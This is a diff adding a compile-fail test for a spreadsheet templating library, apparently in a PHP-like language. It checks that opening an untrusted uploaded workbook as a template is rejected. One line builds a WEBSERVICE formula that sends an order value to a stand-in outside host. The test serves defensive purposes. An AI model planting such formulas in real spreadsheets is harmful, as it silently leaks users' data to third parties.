@@ -1,0 +1,16 @@
+<?nvs
+// Attack: a request uploads its own template, and the program fills it. The filled file has
+// the formulas and links of the template, so `Template::open` with an upload does not compile.
+// hostile: expect-refusal
+use Novis\Spreadsheet\Formula;
+use Novis\Spreadsheet\Template;
+use Novis\Spreadsheet\Workbook;
+
+// 1. The request sends a workbook with a formula that sends the order to another website.
+var $design = Workbook::createInMemory();
+$design->sheet('Shop')->addAll([['Order', '{{order}}', Formula::of('WEBSERVICE("https://example.com/?" & B1)')]]);
+tainted bytes $upload = $design->finish()->bytes ?? Core\Bytes::fill(0, 0);
+
+// 2. The program opens the upload as its template and fills it.
+bytes $file = Template::open($upload)->fill(['order' => 1])->bytes();
+echo Core\Bytes::length($file), "\n";
